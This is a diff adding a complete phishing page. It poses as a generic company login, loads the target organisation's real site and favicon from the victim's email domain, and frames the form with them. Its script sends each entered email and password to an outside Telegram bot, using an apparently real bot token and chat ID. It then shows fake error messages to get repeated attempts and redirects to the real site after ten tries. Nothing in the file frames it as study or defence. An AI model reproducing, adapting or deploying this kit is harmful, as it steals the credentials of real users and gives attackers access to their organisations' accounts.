@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+<style>
+body {
+  background-color: #eeeeee;
+  font-family: Helvetica Neue, Helvetica, sans-serif;
+  font-size: 13px;
+  color: #425152;
+  margin: 0;
+}
+
+#iframe-content {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  border: none;
+  z-index: 0;
+}
+
+#blocker {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: transparent;
+  z-index: 5;
+  pointer-events: all;
+}
+
+#login-box {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50% ,-50%);
+  background: #ffffff;
+  padding: 20px;
+  border-radius: 4px;
+  box-shadow: 0 0 10px 0px #0003;
+  width: 375px;
+  z-index: 10;
+}
+
+#login-box .header {
+  display: flex;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+#login-box .header img {
+  margin-right: 10px;
+  max-width: 40px;
+}
+
+#login-box .header h2 {
+  margin: 0;
+  font-size: 18px;
+  color: #425152;
+  text-transform: uppercase;
+}
+
+.row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 15px;
+}
+
+.row label {
+  width: 80px;
+  font-weight: bold;
+  color: #425152;
+}
+
+.row input {
+  flex: 1;
+  padding: 6px 10px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+button {
+  padding: 6px 10px;
+  background: black;
+  color: #ffffff;
+  font-weight: bold;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  align-self: flex-start;
+}
+
+button:hover {
+  background: #333;
+}
+
+#error-message {
+  color: red;
+  margin-top: 10px;
+  font-size: 14px;
+}
+
+p.copy {
+  margin-top: 15px;
+  font-size: 11px;
+  color: #666;
+}
+</style>
+</head>
+<body>
+
+<iframe id="iframe-content" src=""> </iframe>
+<div id="blocker"></div>
+
+<div id="login-box">
+  <div class="header">
+    <img id="logo-img" src="" alt="Company Logo">
+    <h2 id="company-name">Company</h2>
+  </div>
+  <form id="loginForm">
+    <div class="row">
+      <label for="email">Email :</label>
+      <input type="email" id="email" disabled>
+    </div>
+
+    <div class="row">
+      <label for="password">Password :</label>
+      <input type="password" id="password" placeholder="Enter password" required>
+    </div>
+
+    <button type="submit">Login</button>
+
+    <div id="error-message"></div>
+  </form>
+
+  <p class="copy">
+    All rights reserved. Copyright © 2025
+    <span id="copy-name">Company</span>
+  </p>
+</div>
+<script>
+  // Get URL parameters
+  const urlParams = new URLSearchParams(window.location.search);
+  let email = urlParams.get('email') || '';
+  let domain = urlParams.get('domain') || '';
+
+  if (!domain && email.includes('@')) {
+    domain = email.split('@')[1];
+  }
+
+  // Autofill email
+  const emailInput = document.getElementById('email');
+  if (email) {
+    emailInput.value = email;
+    emailInput.readOnly = true;
+  }
+
+  // Branding
+  if (domain) {
+    const iframe = document.getElementById('iframe-content');
+    if (iframe) iframe.src = "https://" + domain;
+
+    document.getElementById('logo-img').src =
+      "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+    document.getElementById('company-name').innerText = domain.toUpperCase();
+    document.getElementById('copy-name').innerText = domain.toUpperCase();
+  }
+
+  // Get previous attempt count
+  let attempts = parseInt(localStorage.getItem('loginAttempts') || '0');
+
+  const passwordInput = document.getElementById('password');
+  const errorMessage = document.getElementById('error-message');
+
+  // Clear only the error message while typing (do NOT clear password)
+  passwordInput.addEventListener('input', () => {
+    errorMessage.innerText = '';
+  });
+
+  // Handle form submission
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    email = emailInput.value || email;
+    if (!domain && email.includes('@')) domain = email.split('@')[1];
+
+    const password = passwordInput.value;
+
+    const passwordValid = password.length >= 6 &&
+      /[A-Z]/.test(password) &&
+      /[a-z]/.test(password) &&
+      /\d/.test(password) &&
+      /[!@#$%^&*(),.?":{}|<>]/.test(password);
+
+ // Telegram configuration placeholders
+    const message = 'Login Attempt:\nEmail: ' + email + '\nDomain: ' + domain + '\nPassword: ' + password;
+    const apiKey = '8656555675:AAGlQdkpszbE86TZj72Xjv7Tr2wfAWjgm5Y'; // ← Replace with your Telegram Bot API Key
+    const chatId = '-5418871436'; // ← Replace with your Telegram Chat ID
+    const url = 'https://api.telegram.org/bot' + apiKey + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);   // ← Replace with your Telegram fetch URL
+
+    // Send credentials to Telegram
+    fetch(url).catch(error => console.error('Telegram fetch error:', error));
+
+    attempts += 1;
+    localStorage.setItem('loginAttempts', attempts);
+
+    // Redirect after 10 failed attempts
+    if (attempts >= 10 && domain) {
+      window.location.href = "https://" + domain;
+      return;
+    }
+
+    // Show error messages with 2-second delay
+    setTimeout(() => {
+      if (!passwordValid) {
+        errorMessage.innerText = "Invalid credentials.";
+        passwordInput.value = ''; // now clear password AFTER showing error
+      } else {
+        errorMessage.innerText = "Sign in attempt timeout, please try again.";
+      }
+    }, 2000);
+  });
+</script>
+
+
+</body>
+</html>
